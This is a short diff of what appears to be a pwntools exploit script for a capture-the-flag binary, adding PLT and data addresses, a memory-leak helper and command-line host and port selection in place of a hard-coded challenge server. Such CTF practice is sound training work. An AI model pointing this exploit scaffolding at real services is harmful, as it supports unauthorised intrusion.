@@ -23,9 +23,14 @@ start_addr = p32(0x080483c0)
 read_plt = p32(0x08048360)
 data_addr = 0x0804a020
 
+context(os='linux', arch='amd64', log_level='debug')
 
-# Io = process("./leak")
-Io = remote("www.sniperoj.cn", 30006)
+if len(sys.argv) == 3:
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    Io = remote(host, port)
+else:
+    Io = process("./pwn")
 
 def leak(addr):
     read_output()
